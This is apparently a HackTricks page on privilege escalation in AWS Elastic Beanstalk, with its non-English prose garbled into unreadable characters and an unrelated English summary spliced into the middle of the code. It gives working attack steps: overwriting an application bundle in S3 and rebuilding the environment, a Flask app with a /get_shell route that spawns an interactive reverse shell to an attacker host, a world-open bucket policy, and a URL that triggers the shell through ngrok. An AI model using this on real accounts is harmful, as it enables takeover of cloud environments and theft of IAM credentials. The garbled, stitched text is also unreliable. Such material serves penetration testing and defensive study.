# AWS - Elastic Beanstalk рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## Elastic Beanstalk

рдЕрдзрд┐рдХ **Elastic Beanstalk рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА**:

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Beanstalk рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдмрд╣реБрдд рд╕рд╛рд░реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдмрд╣реБрдд рд╕рд╛рд░реА рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ** рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk`** рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ
{% endhint %}

### `elasticbeanstalk:RebuildEnvironment`, S3 рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдФрд░ рдмрд╣реБрдд рд╕рд╛рд░реА рдЕрдиреНрдп

**рдХреЛрдб** рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ **S3 рдмрдХреЗрдЯ рдкрд░ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдХреЗ рд╕рд╛рде рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ **рдкреБрдирд░реНрдирд┐рд░реНрдорд╛рдг** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде (рдЗрд╕рдХреЗ рд▓рд┐рдП `elasticbeanstalk:RebuildEnvironment` рдФрд░ `S3`, `EC2` рдФрд░ `Cloudformation` рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХреБрдЫ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ), рдЖрдк **рдХреЛрдб** рдореЗрдВ **рдкрд░рд┐рд╡рд░реНрддрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрдорд╛рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдЧрд▓реА рдмрд╛рд░ рдЬрдм рдЖрдк рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪреЗрдВрдЧреЗ рддреЛ рд╡рд╣ рдЖрдкрдХреЗ рдирдП рдХреЛрдб рдХреЛ **рдЪрд▓рд╛рдПрдЧрд╛**, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдЗрд╕рдХреЗ IAM рднреВрдорд┐рдХрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВред

{% code overflow="wrap" %}
```bash
# Create folder
mkdir elasticbeanstalk-eu-west-1-947247140022
cd elasticbeanstalk-eu-west-1-947247140022
# Download code
aws s3 sync s3://elasticbeanstalk-eu-west-1-947247140022 .
# Change code
unzip 1692777270420-aws-flask-app.zip
zip 1692777270420-aws-flask-app.zip <files to zip>
# Upload code
aws s3 cp 1692777270420-aws-flask-app.zip s3://elasticbeanstalk-eu-west-1-947247140022/1692777270420-aws-flask-app.zip
# Rebuild env
aws rebuild-environment --environment-name "env-name"
```
{% endcode %}

### `elasticbeanstalk:CreateApplication`,  `elasticbeanstalk:CreateEnvironment`, `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `iam:PassRole`, рдФрд░ рдЕрдзрд┐рдХ...

рдЙрдкрд░реЛрдХреНрдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХрдИ **`S3`**, **`EC2`, `cloudformation`** ,**`autoscaling`** рдФрд░ **`elasticloadbalancing`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ рдПрдХ рд░реЙ рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдмреАрдирд╕реНрдЯреЙрдХ рд╕реНрдерд┐рддрд┐ рдХреЛ рд╢реБрд░реВ рд╕реЗ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

* рдПрдХ AWS Elastic Beanstalk рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛рдПрдВ:
```bash
aws elasticbeanstalk create-application --application-name MyApp
```
* рдПрдХ AWS Elastic Beanstalk environment рдмрдирд╛рдПрдВ ([**рд╕рдорд░реНрдерд┐рдд platforms**](https://docs.aws.amazon.com/elasticbeanstalk/latest/platforms/platforms-supported.html#platforms-supported.python)):

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk create-environment --application-name MyApp --environment-name MyEnv --solution-stack-name "64bit Amazon Linux 2 v3.4.2 running Python 3.8" --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=aws-elasticbeanstalk-ec2-role
```
{% endcode %}

рдпрджрд┐ рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЖрдк **рдирдпрд╛ рдирд╣реАрдВ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рд╕рд┐рд░реНрдл **рдореМрдЬреВрджрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

* рдЕрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛрдб рдФрд░ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдПрдХ ZIP рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреИрдХ рдХрд░реЗрдВ:
```python
zip -r MyApp.zip .
```
* S3 рдмрдХреЗрдЯ рдореЗрдВ ZIP рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ:
```python
aws s3 cp MyApp.zip s3://elasticbeanstalk-<region>-<accId>/MyApp.zip
```
* рдПрдХ AWS Elastic Beanstalk рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡рд░реНрдЬрди рдмрдирд╛рдПрдВ:

{% code overflow="wrap" %}
```css
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-1.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="MyApp.zip"
```
{% endcode %}

* рдЕрдкрдиреЗ AWS Elastic Beanstalk environment рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╡рд░реНрдЬрди рдХреЛ рдбрд┐рдкреНрд▓реЙрдп рдХрд░реЗрдВ:

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0
```
{% endcode %}

### `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `cloudformation:GetTemplate`, `cloudformation:DescribeStackResources`, `cloudformation:DescribeStackResource`, `autoscaling:DescribeAutoScalingGroups`, `autoscaling:SuspendProcesses`, `autoscaling:SuspendProcesses`

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рдПрдХ **рд╡реИрдз Beanstalk environment** рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдЖрдк **рдкреАрдбрд╝рд┐рдд** рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ, **рдкрд┐рдЫрд▓реЗ рдЪрд░рдгреЛрдВ** рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдПред рд╕рдВрднрд╡рддрдГ рдПрдХ рд╕рд╛рдзрд╛рд░рдг **zip** рдЬрд┐рд╕рдореЗрдВ рдпреЗ **2 рдлрд╝рд╛рдЗрд▓реЗрдВ** рд╣реЛрдВ:

{% tabs %}
{% tab title="application.py" %}
```python
from flask import Flask, request, jsonify
import subprocess,os, socket

application = Flask(__name__)

@application.errorhandler(404)
def page_not_found(e):
return jsonify('404')

@application.route("/")
def index():
return jsonify('Welcome!')


@application.route("/get_shell")
def search():
host=request.args.get('host')
port=request.args.get('port')
if host and port:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
return jsonify('done')

if __name__=="__main__":
application.run()
```
{% endtab %}

{% tab title="requirements.txt" %}
```
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
Werkzeug==1.0.1
```
{% endtab %}
{% endtabs %}

рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЕрдкрдирд╛ Beanstalk env рдЪрд▓ рд░рд╣рд╛ рд╣реЛ** рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ rev shell рд╣реЛ, рддреЛ рдЕрдм рдпрд╣ рд╕рдордп рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕реЗ **рдкреАрдбрд╝рд┐рддреЛрдВ** env рдореЗрдВ **рдорд╛рдЗрдЧреНрд░реЗрдЯ** рдХрд░реЗрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЕрдкрдиреЗ Beanstalk S3 рдмрдХреЗрдЯ рдХреА **рдмрдХреЗрдЯ рдиреАрддрд┐ рдХреЛ рдЕрдкрдбреЗрдЯ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рддрд╛рдХрд┐ **рдкреАрдбрд╝рд┐рдд рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХреЗ** (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рд╕реЗ рдмрдХреЗрдЯ рдХреЛ **рд╕рднреА рдХреЗ рд▓рд┐рдП рдЦреЛрд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**):
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "eb-af163bf3-d27b-4712-b795-d1e33e331ca4",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"s3:ListBucket",
"s3:ListBucketVersions",
"s3:GetObject",
"s3:GetObjectVersion",
"s3:*"
],
"Resource": [
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022",
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022/*"
]
},
{
"Sid": "eb-58950a8c-feb6-11e2-89e0-0800277d041b",
"Effect": "Deny",
"Principal": {
"AWS": "*"
},
"Action": "s3:DeleteBucket",
"Resource": "arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022"
}
]
}
```
# AWS Elastic Beanstalk Privilege Escalation

## Introduction

AWS Elastic Beanstalk is a fully managed service that makes it easy to deploy and run applications in multiple languages. However, misconfigurations in Elastic Beanstalk environments can lead to privilege escalation vulnerabilities.

## Privilege Escalation Techniques

### 1. Environment Variables

#### Description

Environment variables in Elastic Beanstalk can be used to store sensitive information such as API keys, database credentials, and other secrets. If these variables are not properly protected, an attacker can escalate their privileges by accessing and abusing them.

#### Exploitation

1. Identify the Elastic Beanstalk environment.
2. Use the AWS CLI or SDK to retrieve the environment variables.
3. Analyze the retrieved variables for any sensitive information.
4. Exploit the sensitive information to escalate privileges.

### 2. IAM Roles

#### Description

IAM roles in Elastic Beanstalk define the permissions and access policies for the resources within an environment. If an IAM role is misconfigured, an attacker can abuse it to gain unauthorized access and escalate privileges.

#### Exploitation

1. Identify the Elastic Beanstalk environment.
2. Use the AWS CLI or SDK to retrieve the IAM role associated with the environment.
3. Analyze the permissions and policies assigned to the IAM role.
4. Exploit any misconfigurations or overly permissive policies to escalate privileges.

### 3. Instance Profiles

#### Description

Instance profiles in Elastic Beanstalk are used to grant permissions to EC2 instances running within an environment. If an instance profile is misconfigured, an attacker can abuse it to gain unauthorized access and escalate privileges.

#### Exploitation

1. Identify the Elastic Beanstalk environment.
2. Use the AWS CLI or SDK to retrieve the instance profile associated with the environment.
3. Analyze the permissions and policies assigned to the instance profile.
4. Exploit any misconfigurations or overly permissive policies to escalate privileges.

## Mitigation

To mitigate privilege escalation vulnerabilities in AWS Elastic Beanstalk, follow these best practices:

1. Securely manage environment variables by encrypting sensitive information and restricting access to authorized users.
2. Regularly review and update IAM roles to ensure they have the least privilege necessary.
3. Regularly review and update instance profiles to ensure they have the least privilege necessary.
4. Enable AWS CloudTrail to monitor and log all API calls made to Elastic Beanstalk environments.

By following these best practices, you can reduce the risk of privilege escalation in Elastic Beanstalk environments.
```bash
# Use a new --version-label
# Use the bucket from your own account
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-2.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="revshell.zip"

# These step needs the extra permissions
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0

# To get your rev shell just access the exposed web URL with params such as:
http://myenv.eba-ankaia7k.us-east-1.elasticbeanstalk.com/get_shell?host=0.tcp.eu.ngrok.io&port=13528
```
{% endcode %}

<details>

<summary><strong>рдмрдврд╝рд┐рдпрд╛ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
